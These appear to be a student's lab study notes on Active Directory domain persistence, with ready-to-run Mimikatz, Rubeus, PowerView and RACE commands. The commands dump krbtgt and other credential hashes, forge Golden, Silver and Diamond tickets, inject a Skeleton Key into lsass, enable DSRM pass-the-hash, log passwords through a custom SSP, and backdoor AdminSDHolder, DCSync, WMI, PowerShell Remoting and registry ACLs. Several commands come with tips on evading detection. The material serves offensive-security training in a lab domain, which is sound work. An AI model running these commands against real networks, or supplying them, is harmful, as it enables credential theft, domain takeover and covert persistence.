# Persistence - Golden Ticket

A **Golden Ticket** is signed and encrypted by the hash of **`krbtgt`** account which makes it a valid TGT ticket. The **`krbtgt`** user hash could be used to impersonate any user with any privileges from even a non-domain machine.

![[Golden Ticket Attack.png]]

**Attack Steps:**
1. Acquire AES key of the **`krbtgt`** account
2. Forge the TGT using AES key of the **`krbtgt`** account to get the desired privileges
   
> [!important]
> We can user the NTLM Hash of the **krbtgt** account, but it is not OPSEC safe.

**How to get the `krbtgt` hash?**

```powershell
# Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'

# To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Using the DCSync option needs no code execution on the target DC
```

> [!info]
> **krbtgt** account has a password history, if the current password failed to decrypt the TGT, it uses the older password found in the history.
> This is why if you want it changed, you must change it twice 

> [!note]
> **Krbtgt** hash could also be dumped from NTDS.di.

## Golden Ticket - Rubeus

```powershell title:"Rubeus -  Forge Golden Ticket"
# Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:

1. To retrieve flags for user specified in /user.
2. To retrieve /groups, /pgid, /minpassage and /maxpassage
3. To retrieve /netbios of the current domain

If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more OPSEC friendly).
The Golden ticket forging command looks like this:

```powershell title:"Rubeus -  Forge Golden Ticket (More OPSEC Safe)"
C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA84 8 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948 3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

![[Golden Ticket 1.png]]
![[Golden Ticket 2.png]]

# Persistence - Silver Ticket

A valid Service Ticket or **TGS** ticket (Golden ticket is TGT).
Encrypted and Signed by the hash of the **service account** (Golden ticket is signed by hash of **`krbtgt`**) of the service running with that account.
Services will allow access only to the services themselves.
Reasonable persistence period (default 30 days for computer accounts).

![[Silver Ticket Attack.png]]

**Attack Steps:**
1. Acquire AES key/NTLM hash of the target **Service Account**
2. Forge the ST/TGS using the secret of the target service account

> [!note]
> **Silver Ticket** Attacks are more OPSEC safe than the **Golden Ticket** attacks
> ****
> Even MDI doesn't care about service tickets. Even if it was used to login to the DC

## Silver Ticket - Rubeus

```powershell title:"Forging Silver Ticket using Rubeus"
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

Just like the Golden ticket, /ldap option queries DC for information related to the user.
Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.

> [!info]
>HOST service provides access to the scheduled tasks on the machine
>****
>PRCSS provides access to host plus RPCSS Two tickets allow you to access using WMI (Host plus RPCSS together allows you to access WMI)
>****
>CIFS allows you to access File System
>****
>LDAP service provides you to be able to run the DC Sync Attack

# Persistence - Diamond Ticket

Golden Ticket attack is a ticket forging attack and a Diamond Ticket attack is a ticket repackaging attack. You decrypt it, make changes to it and re-encrypt it again and sent it to the DC.

![[Diamond Ticket Attack.png]]

**Attack Steps:**
1. Acquire AES key of the **`krbtgt`** account.
2. Decrypt the TGT using AES key of the **`krbtgt`** account.
3. Modify the TGT to get the desired privileges.
4. Re-encrypt the TGT using AES key of the **`krbtgt`** account

We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):

```powershell title:"Diamond Ticket - Rubeus"
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student467 /password:uN485cJuzTVJrJhGWL8a /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

We could also use **`/tgtdeleg`** option in place of credentials in case we have access as a domain user:

```powershell title:"Diamond Ticket - Rubeus"
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# Persistence - Skeleton Key

Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.

Use the below command to inject a skeleton key (password would be **`mimikatz`**) on a Domain Controller of choice. DA privileges required

```powershell title:"Skeleton Key - Mimikatz"
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

Now, it is possible to access any machine with a valid username and password as "mimikatz"

```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.

In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

```powershell
mimikatz # privilege::debug 
mimikatz # !+ 
mimikatz # !processprotect /process:lsass.exe /remove 
mimikatz # misc::skeleton 
mimikatz # !
```

Note that above would be very noisy in logs - Service installation (Kernel mode driver)

# Persistence - DSRM

- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

Dump **DSRM** password (needs DA privileges)

```powershell title:"Dump DSRM Password - Mimikatz"
SafetyKatz.exe "token::elevate" "lsadump::sam"
```

Since it is the local administrator of the DC, we can pass the hash to authenticate.
But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash

```powershell
winrs -r:dcorp-dc cmd

reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Use below commands to Pass-the-hash of DSRM administrator and access the DC:

```powershell title:"DSRM - Pass the Hash - Mimikatz"
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe" # (This is **Logon Type 9**, which means if we run `whoami`, we'll still get `studentx`)

Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

# Persistence - Custom SSP

A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:
- NTLM
- Kerberos
- Wdigest
- CredSSP

**Mimikatz** provides a custom SSP - **`mimilib.dll`**. This SSP logs local logons, service account and machine account passwords in *clear text* on the target server.

We can use either of the ways:

```PowerShell title:"Custom SSP - Mimikatz"
# Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
$packages += "mimilib" 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
SafetyKatz.exe -Command '"misc::memssp"'
```

All local logons on the DC are logged to 

```powershell
C:\Windows\system32\mimilsa.log
```

> [!note]
>In other Persistence  techniques, we needed Domain Admin privileges to set up the persistence but we never needed DA privileges to use the persistence.
>****
>In **Custom SSP** technique, we need DA privileges to both set up the persistence and use it.

# Persistence using ACLs
## **Persistence using ACLs - AdminSDHolder**

Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups ( called Protected Groups).

Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of **AdminSDHolder** and any differences are overwritten on the object ACL.

**Protected Groups**:

![[Protected Groups.png]]

Well known abuse of some of the Protected Groups - All of the below can log on locally to DC

![[Abuse Protected Groups.png]]

With DA privileges (Full Control/Write permissions) on the **AdminSDHolder** object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the **AdminSDHolder** object.

In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

Add **FullControl** permissions for a user to the **AdminSDHolder** using **PowerView** as DA:

```powershell title:"Add FullControl to AdminSDHolder - PowerView"
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Using Active Directory Module and RACE toolkit (https://github.com/samratashok/RACE ) :

```PowerShell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

Other interesting permissions **(ResetPassword, WriteMembers)** for a user to the **AdminSDHolder**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc al' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Run **SDProp** manually using **Invoke-SDPropagator.ps1** from Tools directory:

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

For pre-Server 2008 machines:

```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

Check the Domain Admins permission - **PowerView** as normal user:

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```

Using Active Directory Module:

```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Ac cess | ?{$_.IdentityReference -match 'student1'}
```

Abusing **FullControl** using **PowerView**:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

Using Active Directory Module: 

```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

Abusing **`ResetPassword`** using **PowerView**:

```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText Force) -Verbose
```

Using Active Directory Module:

```powershell
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText Force) -Verbose
```

## Persistence using ACLs - Rights Abuse

There are even more interesting ACLs which can be abused. For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like **FullControl** or the ability to run **"DCSync"**.

```powershell title:"Add FullControl rights"
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Using Active Directory Module and RACE:

```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
```

Add rights for **DCSync**:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Using Active Directory Module and RACE:

```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync Verbose
```

Execute **DCSync**:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

Or

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

> [!note]
>For **DCSync**  attack we only need to add 2 permissions:
>1. Replicating Directory Changes
>2. Replicating Directory Changes All

## **Persistence using ACLs - Security Descriptors**

It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
Administrative privileges are required for this.

Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:

```powershell title:ACE
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid

# ACE for built-in administrators for WMI namespaces
A;CI;CCDCLCSWRPWPRCWD;;;SID
```

### Persistence using ACLs - Security Descriptors - WMI

When you try to connect to a machine using **WMI**, there are two places where ACLs are checked.
First one is **"Component Services" (The DCOM Endpoint)**. Second one is in the **WMI Namespaces**, go to **"Computer Management"** then check the properties of the **"WMI Control"**.

ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:

```powershell
# Run this command as Domain Administrator
. C:\AD\Tools\RACE-master\RACE.ps1

# On local machine for student1:
Set-RemoteWMI -SamAccountName student1 -Verbose

# On remote machine for student1 without explicit credentials: 
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

# On remote machine remove permissions:
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

### Persistence using ACLs - Security Descriptors - PowerShell Remoting

Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches

```powershell
# On local machine for student1
Set-RemotePSRemoting -SamAccountName student1 -Verbose

# On remote machine for student1 without credentials
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose

# On remote machine, remove the permissions:
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```

### Persistence using ACLs - Security Descriptors - Remote Registry

```powershell
# Using RACE or DAMP, with admin privs on remote machine
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose

# As student1, retrieve machine account hash: 
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve domain cached credentials:
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

